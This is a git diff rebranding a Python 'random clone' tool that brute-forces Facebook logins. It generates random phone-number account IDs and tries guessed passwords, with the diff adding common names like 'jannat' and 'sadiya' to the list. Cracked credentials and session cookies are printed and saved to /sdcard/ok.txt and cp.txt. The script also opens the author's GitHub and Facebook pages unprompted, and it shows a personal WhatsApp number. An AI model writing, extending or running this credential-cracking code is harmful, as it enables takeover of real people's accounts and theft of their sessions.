@@ -1,6 +1,6 @@
-#Create By: MD RABBY SHEIKH 
+#Create By: MD BIPUL SHEIKH 
 #FaceBook: ßK Rãbby Mal'ß
-#GitHub: https://github.com/rabby677
+#GitHub: https://github.com/BIPUL677
 #---------------------------------------------------------------------------#
 import os,sys,time,json,random,re,string,platform,base64,uuid
 from bs4 import BeautifulSoup as sop
@@ -72,7 +72,7 @@ for xd in range(10000):
     f=random.randrange(1, 99)
     uaku2=(f'{a}{b}{c}{d}{e}{f}')
     ugen.append(uaku2)
-os.system('xdg-open https://github.com/RABBY-404-CYBER')
+os.system('xdg-open https://github.com/bipul159')
 logo = ("""
 \033[1;91m    
  _______  _______  ______   ______             
@@ -85,13 +85,13 @@ logo = ("""
 |/   \__/|/     \||/ \___/ |/ \___/    \_/     
                                                
  ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
- ┃ [✓] AUTHOR    \033[1;91m: \033[1;92mRABBY SHEIKH           ┃
+ ┃ [✓] AUTHOR    \033[1;91m: \033[1;92mBIPUL KHAN           ┃
  ┃ [✓] TOOL      \033[1;91m: \033[1;92mRANDOM CLONE               ┃
  ┃ [✓] STATUS    \033[1;91m: \033[1;92mFREE                       ┃
  ┃ [✓] SYSTEM    \033[1;91m: \033[1;92mDATA & WIFI                ┃
- ┃ [✓] GITHUB    \033[1;91m: \033[1;92mRABBY-909            ┃
- ┃ [✓] FACEBOOK  \033[1;91m: \033[1;92mẞK Rãbby Mal'ß                ┃
- ┃ [✓] WHATSAPP  \033[1;91m: \033[1;92m+8801709278281             ┃
+ ┃ [✓] GITHUB    \033[1;91m: \033[1;92mBIPUL-909            ┃
+ ┃ [✓] FACEBOOK  \033[1;91m: \033[1;92mBK BIPUL KHAN                ┃
+ ┃ [✓] WHATSAPP  \033[1;91m: \033[1;92m+88017********             ┃
  ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛""")
 
 class Main:
@@ -106,13 +106,13 @@ class Main:
         print(" [02] Random Email Clone ")
         print(" [00] Exit")
         print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-        RABBY =input(" [?] Choose : ")
+        BIPUL =input(" [?] Choose : ")
         os.system('xdg-open https://www.facebook.com/mdbipul.khan.1420354')
-        if RABBY in ["1", "01"]:
+        if BIPUL in ["1", "01"]:
             num()
-        if RABBY in ["2","02"]:
+        if BIPUL in ["2","02"]:
             gml()
-        if RABBY in [" 0", "00"]:
+        if BIPUL in [" 0", "00"]:
             exit()
         else:
             exit()
@@ -144,7 +144,7 @@ def num():
         print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
         for guru in user:
             uid = kode+kodex+kod+guru
-            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,]
+            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'jannat','sadiya','shakil','tamanna','mababa','nusrat','ayesha','saiful','freefire','mimmim','jannatul','sonali']
             yaari.submit(rcrack1,uid,pwx,tl)
     print(' [+] Crack process has been completed')
     print(' [+] Ids saved in ok.txt,cp.txt')
@@ -194,7 +194,7 @@ def rcrack1(uid,pwx,tl):
         for ps in pwx:
             pro = random.choice(ugen)
             session = requests.Session()
-            sys.stdout.write('\r[\033[1;92mRABBY\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
+            sys.stdout.write('\r[\033[1;92mBIPUL\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
             sys.stdout.flush()
             free_fb = session.get('https://p.facebook.com').text
             log_data = {
@@ -230,7 +230,7 @@ def rcrack1(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print(f"\033[38;5;46m[RABBY-OK] {uid} | {ps}")
+                print(f"\033[38;5;46m[BIPUL-OK] {uid} | {ps}")
                 print(f" Cookie : {coki}")
                 open('/sdcard/ok.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(uid)
@@ -238,14 +238,14 @@ def rcrack1(uid,pwx,tl):
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[82:97]
-                print(f"\x1b[38;5;196m[RABBY-CP] {cid} | {ps}")
+                print(f"\x1b[38;5;196m[BIPUL-CP] {cid} | {ps}")
                 open('/sdcard/cp.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(uid)
                 break
             else:
                 continue
         loop+=1
-        #sys.stdout.write(f'\r\033[m[RABBY] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
+        #sys.stdout.write(f'\r\033[m[BIPUL] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
         #sys.stdout.flush()
     except:
         pass
